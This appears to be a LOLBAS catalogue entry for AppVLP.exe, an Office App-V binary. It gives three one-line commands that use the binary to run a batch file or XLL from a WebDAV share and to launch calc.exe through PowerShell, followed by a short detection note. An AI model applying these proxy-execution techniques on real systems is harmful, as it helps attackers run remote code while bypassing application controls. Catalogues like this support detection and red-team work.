## Appvlp.exe

* Functions: Execute

```
AppVLP.exe \\webdav\calc.bat   

AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe', '', '', 'open', 1)"    

AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"    
```

Acknowledgements:
* Will - @moo_hax

Code sample:
* 

Resources:
* https://github.com/MoooKitty/Code-Execution
* https://twitter.com/moo_hax/status/892388990686347264

Full path:
```
"C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe"
```

Notes:
Used by App-V


Detection:
Appvlp.exe spawning other process

 
